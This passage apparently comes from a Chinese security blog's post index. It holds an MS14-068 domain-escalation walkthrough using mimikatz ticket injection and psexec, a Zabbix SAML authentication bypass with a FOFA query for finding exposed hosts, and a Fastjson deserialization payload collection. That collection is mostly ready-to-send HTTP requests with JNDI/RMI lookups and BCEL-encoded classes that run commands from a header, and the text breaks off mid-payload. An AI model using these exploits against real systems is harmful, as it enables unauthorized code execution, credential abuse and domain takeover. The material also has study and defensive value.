使用MS14-068.exe工具生成票据，网上的版本有很多，有py版本的，有windows可执行文件exe版本的\n ms14-068 -u 域用户名@域名 -p 域用户密码 -s 域sid号 -d 域控主机名\n域成员：liming\n域名：sec.com\nliming的 sid：S-1-5-21-1051416441-2990317049-3628072545-1182\n域控制器地址：192.168.15.251\n域成员 mary 的密码：admin!@#45\n 使用命令如下：\nMS14-068.exe -u liming@sec.com -p liming123 -s S-1-5-21-1051416441-2990317049-3628072545-1182 -d SCENE\r 之后会在当前路径下生成一个名为 ：TGT_liming@sec.com.ccahe.ccache 的票据文件。\n查看注入前的权限 测试是否可以访问域控共享文件\ndir \\\\域控主机名.域名\\c$\r 可以看到显示 “拒绝访问”，这是正常，域普通用户当然没有权限访问域控共享文件。\n清除内存中所有票据 进入mimikatz目录 在改文件下 右键选择\u0026quot;在此处打开命令行窗口\u0026quot;\n进入 mimikatz\nkerberos::purge 清除票据(清空当前系统中的票据，防止其他票据对实验环境进行干扰)\rkerberos::list //查看凭证\r 将高权限票据注入内存 使用以下命令将票据注入内存\nkerberos::ptc 凭证地址\r 显示 Injecting ticket：OK ，表示注入成功！\n验证权限 再次访问域控的共享文件，即可发现已经成功列出目录了\n使用 Psexec64.exe 横向移动, 在wndowsTools文件夹中右键选择\u0026quot;在此处打开命令行窗口\u0026quot;\n-\n在命令行中输入， 成功获取域控权限。\npsexec.exe \\\\scene.sec.com cmd\r ","id":6,"section":"posts","summary":"0x01 漏洞详情 本场景中包含了域控和域用户, 通过登录域用户主机对域控进行攻击, 攻击成功后将域内任意用户权限提升至域管理级别, 从而获取整个域权限。 0x02","tags":["域渗透","内网渗透"],"title":"MS14-068域控提权漏洞(CVE-2014-6324)","uri":"https://ad-calcium.github.io/2022/02/%E5%9F%9F%E6%B8%97%E9%80%8F-ms14-068%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2014-6324/","year":"2022"},{"content":"0x01 漏洞描述 Zabbix对客户端提交的Cookie会话存在不安全的存储方式，导致在启动SAML SSO认证模式的前提下，恶意用户可通过构造特殊请求绕过认证，获取管理员权限。\r 0x02 受影响的版本 5.4.0 - 5.4.8\r6.0.0alpha1\r 0x03 FOFA语法 app=\u0026quot;ZABBIX-监控系统\u0026quot; \u0026amp;\u0026amp; body=\u0026quot;saml\u0026quot;\r 0x04 漏洞复现 请求接口，获取session\nhttp://IP/\r 将session填入cookie中，成功跳转到zabbix.php?action=dashboard.view\nGET /index_sso.php HTTP/1.1\rHost: 138.68.159.143\rUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, houzidiandian) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.53 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\rAccept-Encoding: gzip, deflate\rAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\rCache-Control: max-age=0\rConnection: close\rCookie: zbx_session=xxxx\r 可以使用浏览器插件替换cookie，即可登录后台\nhttp://IP/zabbix.php?action=dashboard.view\r 脚本验证\n脚本地址：https://raw.githubusercontent.com/ad-calcium/vuln_script/main/CVE-2022-23131.py\n0x05 参考文章 https://github.com/jweny/zabbix-saml-bypass-exp\rhttps://mp.weixin.qq.com/s/-TAUjvdigi9TzjoPpMe1kw\r ","id":7,"section":"posts","summary":"0x01 漏洞描述 Zabbix对客户端提交的Cookie会话存在不安全的存储方式，导致在启动SAML SSO认证模式的前提下，恶意用户可通过构造特殊请","tags":["漏洞复现","zabbix"],"title":"Zabbix SAML SSO认证绕过(CVE-2022-23131)","uri":"https://ad-calcium.github.io/2022/02/zabbix-saml-sso%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2022-23131/","year":"2022"},{"content":"文章转载至：https://github.com/safe6Sec/Fastjson\n说明 高版本的一些细节还有待更新。本项目涉及的一些姿势和payload是从之前的随手记的笔记直接粘进来的，很多找不到出处了所以来源未贴出来，忘师傅们见谅。\n自我提问 学完后应该能回答如下问题。\n parse 和 parseObject的区别 主要exp有哪几种 不出网怎么利用 templatesimpl为什么鸡肋 高版本jdk bcel为什么失败 1.2.48通杀exp原理是什么 如何突破parse不能调用所有getters方法的限制 1.2.68绕过原理是什么  探测 用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。\nfastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。\n主要是利用各个类被加入黑名单的方式进行判断\n原理重点关注MiscCodec处理时会去nwe URL，然后通过后面的map#put触发计算key的hash。学习urldns链容易理解。\nfastjson \u0026gt;1.2.43\n{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;} {{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}:\u0026quot;x\u0026quot;}  fastjson \u0026gt;1.2.48\n{\u0026quot;@type\u0026quot;:\u0026quot;java.net.InetAddress\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}  fastjson \u0026gt;1.2.68\n{\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet4Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet6Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;} {{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}:\u0026quot;aaa\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, {\u0026quot;@type\u0026quot;: \u0026quot;java.net.URL\u0026quot;, \u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}}\u0026quot;\u0026quot;} Set[{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}] Set[{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;} {\u0026quot;@type\u0026quot;:\u0026quot;java.net.InetSocketAddress\u0026quot;{\u0026quot;address\u0026quot;:,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}} {{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}:0  利用链挖掘 https://xz.aliyun.com/t/7482\nhttps://xz.aliyun.com/t/7789#toc-4\n主要用codeql进行挖掘\n/** @kind path-problem */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.dataflow.TaintTracking2 import DataFlow2::PathGraph class JNDIMethod extends Method{ JNDIMethod(){ this.getDeclaringType().getAnAncestor().hasQualifiedName(\u0026quot;javax.naming\u0026quot;, \u0026quot;Context\u0026quot;) and this.hasName(\u0026quot;lookup\u0026quot;) } } class MyTaintTrackingConfiguration extends TaintTracking2::Configuration { MyTaintTrackingConfiguration() { this = \u0026quot;MyTaintTrackingConfiguration\u0026quot; } override predicate isSource(DataFlow::Node source) { exists(FieldAccess fac| source.asExpr() = fac ) } override predicate isSink(DataFlow::Node sink) { exists(MethodAccess call | call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0) ) } } from MyTaintTrackingConfiguration config, DataFlow2::PathNode source, DataFlow2::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, sink.getNode()  各版本利用 除了考虑Fastjson版本，还得考虑JDK版本，中间件版本，第三方依赖版本。\nJDK版本对于JDNI注入的限制，基于RMI利用的JDK版本\u0026lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本\u0026lt;=6u211、7u201、8u191。（更高版本也有绕过）\n更高版本绕过可用https://github.com/veracode-research/rogue-jndi\n jndi  JdbcRowSetImpl C3p0#JndiRefForwardingDataSource JndiDataSourceFactory   bcel  tomcat#dbcp ibatis   TemplatesImpl   Fastjson 1.2.22-1.2.24 JdbcRowSetImpl {\u0026quot;@type\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;rmi://127.0.0.1:1099/badClassName\u0026quot;, \u0026quot;autoCommit\u0026quot;:true}  c3p0#JndiRefForwardingDataSource JdbcRowSetImpl无法成功可以一试\n{\u0026quot;@type\u0026quot;:\u0026quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\u0026quot;,\u0026quot;jndiName\u0026quot;:\u0026quot;rmi://127.0.0.1:1099/badClassName\u0026quot;, \u0026quot;loginTimeout\u0026quot;:0}  shiro#JndiObjectFactory {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.shiro.jndi.JndiObjectFactory\u0026quot;, \u0026quot;resourceName\u0026quot;:\u0026quot;rmi://127.0.0.1:9050/exploit\u0026quot;}  shiro#JndiRealmFactory {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.shiro.realm.jndi.JndiRealmFactory\u0026quot;, \u0026quot;jndiNames\u0026quot;:\u0026quot;rmi://127.0.0.1:9050/exploit\u0026quot;}  bcel 可用于解决不出网利用。 需要注意在Java 8u251以后，bcel类被删除。\ntomcat7\norg.apache.tomcat.dbcp.dbcp.BasicDataSource\ntomcat8及其以后\norg.apache.tomcat.dbcp.dbcp2.BasicDataSource\nPoc\n{ { \u0026quot;x\u0026quot;:{ \u0026quot;@type\u0026quot;: \u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot;, \u0026quot;driverClassLoader\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;driverClassName\u0026quot;: \u0026quot;$$BCEL$$$l$8b$I$A$...\u0026quot; } }: \u0026quot;x\u0026quot; }  exp\n执行命令回显.\nPOST /json HTTP/1.1 Host: 127.0.0.1:9092 Content-Type: application/json cmd: whoami Content-Length: 3327 { { \u0026quot;@type\u0026quot;: \u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, \u0026quot;x\u0026quot;:{ \u0026quot;@type\u0026quot;: \u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot;, \u0026quot;driverClassLoader\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;driverClassName\u0026quot;: \u0026quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\u0026quot; } }: \u0026quot;x\u0026quot; }  POST /json HTTP/1.1 Host: 127.0.0.1:9092 Content-Type: application/json cmd: ver \u0026amp;\u0026amp; echo fastjson Content-Length: 3327 { { \u0026quot;@type\u0026quot;: \u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, \u0026quot;x\u0026quot;:{ \u0026quot;@type\u0026quot;: \u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot;, \u0026quot;driverClassLoader\u0026quot;: { \u0026quot;@type\u0026quot;: \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;driverClassName\u0026quot;: \u0026quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A\u0026quot; } }: \u0026quot;x\u0026quot; }  1.2.33 \u0026lt;= fastjson \u0026lt;= 1.2.47 POST /json HTTP/1.1 Host: 127.0.0.1:9092 Content-Type: application/json cmd: whoami Content-Length: 3647 { \u0026quot;xx\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot; : \u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot; }, \u0026quot;x\u0026quot; : { \u0026quot;name\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot; : \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, { \u0026quot;@type\u0026quot;:\u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, \u0026quot;c\u0026quot;: { \u0026quot;@type\u0026quot;:\u0026quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026quot;, \u0026quot;driverClassLoader\u0026quot;: { \u0026quot;@type\u0026quot; : \u0026quot;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026quot; }, \u0026quot;driverClassName\u0026quot;:\u0026quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce